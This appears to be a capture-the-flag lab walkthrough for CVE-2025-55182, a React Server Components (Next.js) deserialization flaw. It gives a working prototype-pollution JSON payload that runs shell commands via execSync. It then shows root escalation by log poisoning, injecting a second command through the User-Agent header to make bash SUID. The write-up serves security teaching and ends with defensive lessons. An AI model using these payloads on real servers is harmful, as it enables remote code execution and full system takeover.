# React2Shell (CVE-2025-55182) - Lab Walkthrough

**Difficulty:** Hard

**Category:** Web Exploitation / Deserialization

## ðŸ“– Overview

This lab simulates **CVE-2025-55182**, a critical deserialization vulnerability in the **React Server Components (RSC)** architecture used by frameworks like Next.js. The vulnerability allows an attacker to manipulate the "Flight Protocol" stream to initialize arbitrary malicious modules, leading to **Remote Code Execution (RCE)**.

Post-exploitation involves a manual privilege escalation challenge targeting a custom background service vulnerable to **Log Poisoning**.

---

## ðŸ•µï¸ Phase 1: Reconnaissance

The target is a modern web application built with Next.js. Our goal is to identify the entry point for **Server Actions**.

### 1. Traffic Analysis

Navigate to the application and interact with the **"Send Diagnostic Packet"** button. Intercept the request using a proxy tool like **Burp Suite**.

**Key Indicators:**

- **Header:** Look for a custom header named `Next-Action`. This contains a unique ID string that routes the request to a specific backend function.

- **Content-Type:** The request uses `multipart/form-data`.

- **Body:** You will see a strange format (e.g., `1:T:Heartbeat_ACK`). This is the **Flight Protocol**, used to stream component data between server and client.

> **Takeaway:** The server accepts serialized objects via this endpoint. If the deserializer is insecure, we can inject malicious objects.

---

## ðŸ’¥ Phase 2: Remote Code Execution (CVE-2025-55182)

The vulnerability lies in how the server "revives" or initializes Lazy Modules. By polluting the prototype (`__proto__`), we can trick the server into treating our payload as a valid module and executing a string of code we provide.

### The Exploit Logic

We need to construct a JSON object that mimics the internal structure of a React Lazy Module.

1. **Trigger:** We set the `then` property to a prototype reference (`$1:__proto__:then`). This forces the server to "await" our object.

2. **Payload:** We verify the protocol expects code in the `_response._prefix` path.

3. **Sink:** The server passes this string to a `Function` constructor, executing it.

### Proof of Concept (PoC)

To verify RCE, we can try to execute a simple command like `id`. Since this is a "blind" execution, we use **Error Reflection** to see the output. We verify the server catches errors and returns them in a `digest` field.

**Template Payload:**

JSON

```
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "_response": {
  "_prefix": "var res = process.mainModule.require('child_process').execSync('id').toString(); throw Object.assign(new Error('RCE'), {digest: res});"
  }
}
```

### Weaponization

1. Send the request to **Burp Repeater**.

2. Replace the multipart body content with the JSON payload above.

3. Send the request.

4. Check the response for the `digest` field. It should contain the output (e.g., `uid=1001(node-lab)...`).

> **Challenge:** Modify the payload to read the user flag located at `/home/node-lab/user.txt`.

**Flag 1:** `VulnOS{REDACTED}`

---

## ðŸ›¡ï¸ Phase 3: Privilege Escalation

We have established a foothold as the `node-lab` user. Now we must escalate to `root`.

### 1. Enumeration

We need to identify processes or scripts running with elevated privileges.

- Check running processes: `ps aux`

- Check writable directories: `/tmp`, `/dev/shm`, `/var/log`

- Check custom scripts: `/usr/local/bin` or `/opt`

Finding:

We identified a Python script (log_monitor.py) running as root.

### 2. Code Analysis (Black Box)

Analyzing the behavior of the script reveals it is processing the web server's access logs (`/var/log/nexus/access.log`).

- It reads new lines from the log.

- It archives them to another file.

- **Vulnerability:** It appears to be reading the **User-Agent** string from the log and passing it to a system command (likely `os.system`) without sanitization.

### 3. Log Poisoning

We can inject a malicious command into the access log by sending a simple HTTP request with a crafted **User-Agent** header.

Injection Strategy:

If the script constructs a command like echo 'User-Agent: [INPUT]' >> archive, we can break out of the quotes.

**Payload Structure:**

Plaintext

```
'; <COMMAND_TO_EXECUTE>; #
```

1. Use Burp Suite to send a request to the server.

2. Change the `User-Agent` header to a command that makes `bash` a SUID binary (or simply reads the flag to a readable location).

   - _Example:_ `'; chmod u+s /bin/bash; #`

3. Wait for the root script to process the log (approx. 10-20 seconds).

4. Execute `/bin/bash -p` to verify you have root privileges.


> **Challenge:** Use this technique to read the root flag located at `/root/flag.txt`.

**Flag 2:** `VulnOS{REDACTED}`

---

## ðŸ“š Lessons Learned

1. **Deserialization is Dangerous:** Never trust serialized objects from user input, especially when using complex protocols like React Flight.

2. **Sanitize Logs:** When processing logs programmatically, treat log entries as untrusted user input. Never pass them directly to shell commands.

3. **Principle of Least Privilege:** Background scripts should not run as root unless absolutely necessary.

---

_For educational purposes only. Developed by VulnOS._
